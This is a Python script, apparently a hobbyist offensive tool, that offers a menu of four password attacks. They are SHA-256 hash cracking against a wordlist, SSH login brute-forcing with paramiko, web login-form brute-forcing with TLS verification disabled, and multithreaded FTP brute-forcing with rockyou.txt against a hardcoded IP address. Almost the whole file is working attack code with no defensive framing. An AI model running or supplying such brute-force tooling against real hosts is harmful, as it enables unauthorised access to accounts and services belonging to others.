from pwn import *
import sys
import hashlib
import paramiko

def sha256_crack():
	wanted_hash = input("Enter hash value:")
	password_file = input("Enter file location: ")
	attempts = 0

	with log.progress("Attempting to crack: {}!".format(wanted_hash)) as p:
	    with open(password_file, "rb") as password_list:
	        for password in password_list:
	            password = password.strip(b"\n")
	            password_hash = hashlib.sha256(password).hexdigest()
	            password_str = password.decode('latin-1', errors='ignore')  # Decode with 'latin-1' and handle errors
	            password_str_ascii = password_str.encode('ascii', errors='ignore')  # Encode to ASCII
	            p.status("[{}] {} == {}".format(attempts, password_str_ascii, password_hash))  # Use password_str_ascii in the format
	            if password_hash == wanted_hash:
	                p.success("\n[->] Password hash found after {} attempts!  \n[->] The original text is: {}".format(attempts, password_str))
	                exit()
	            attempts += 1
	        p.failure("[->] Password hash not found!")
	
def ssh_brute_force(hostname, port, username, password_file):
    try:
        with open(password_file, "r") as file:
            for line in file:
                password = line.strip()
                try:
                    ssh_client = paramiko.SSHClient()
                    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh_client.connect(hostname, port=port, username=username, password=password, timeout=3)
                    print(f"[->] Password found: {password}")
                    ssh_client.close()
                    return password
                except paramiko.AuthenticationException:
                    print(f"[->] Incorrect password: {password}")
                except paramiko.SSHException as e:
                    print(f"[->] SSH error: {e}")
                except Exception as e:
                    print(f"[->] Error: {e}")
    except FileNotFoundError:
        print("[!] Password file not found.")
    print("[!] Password not found.")
    return None

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def web_brute():
    target = input("Enter target login site: ")
    username = input("Enter target username: ")
    passwords = "wordlist.txt"
    needle = "Welcome back"
    with open(passwords, "r") as passwords_file:
        for password in passwords_file:
            password = password.strip("\n").encode()
            sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
            sys.stdout.flush()
            r = requests.post(target, data={"username": username, "password": password}, verify=False)
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write("\t[>>>>] Valid password '{}' found for user '{}'!".format(password.decode(), username))
                sys.exit()
        sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write("\t[>>>>] No password found for '{}'".format(username))

def ftp_brute():
    import ftplib
    from threading import Thread
    import queue
    from colorama import Fore, init
    init()
    q = queue.Queue()
    n_threads = 30
    host = "115.163.76.253"
    user = "test"
    port = 21
    def connect_ftp():
        global q
        while True:
            password = q.get()
            server = ftplib.FTP()
            print("[!] Trying", password)
            try:
                server.connect(host, port, timeout=5)
                server.login(user, password)
            except ftplib.error_perm as e:
                print(f"{Fore.RED}[-] Error: {e}{Fore.RESET}")
            else:
                print(f"{Fore.GREEN}[+] Found credentials: ")
                print(f"\tHost: {host}")
                print(f"\tUser: {user}")
                print(f"\tPassword: {password}{Fore.RESET}")
                with q.mutex:
                    q.queue.clear()
                    q.all_tasks_done.notify_all()
                    q.unfinished_tasks = 0
            finally:
                q.task_done()
    passwords = open("rockyou.txt",encoding="utf-8",errors="ignore").read().split("\n")
    print("[+] Passwords to try:", len(passwords))
    for password in passwords:
        q.put(password)
    for t in range(n_threads):
        thread = Thread(target=connect_ftp)
        thread.daemon = True
        thread.start()
    q.join()

def main():
	print("* 1 For SHA256 Bruteforce \n* 2 For SSH Bruteforce \n* 3 For LoginPage Bruteorce \n* 4 For FTP Bruteforce")
	choice = int(input("Enter number according to your choice :"))
	if choice == 1:
		sha256_crack()
	elif choice == 2:
		hostname = input("Enter hostname or IP address: ")
		port = int(input("Enter port number: "))  # Convert input to integer
		username = input("Enter username: ")
		password_file = input("Enter path to password file: ")
		found_password = ssh_brute_force(hostname, port, username, password_file)
		if found_password:
			print(f"[*] Found password: {found_password}")
		else:
			print("[*] Password not found.")
	elif choice == 3 :
		web_brute()
	elif choice == 4:
		ftp_brute()
	else:
		print("In Progress!...")
main()
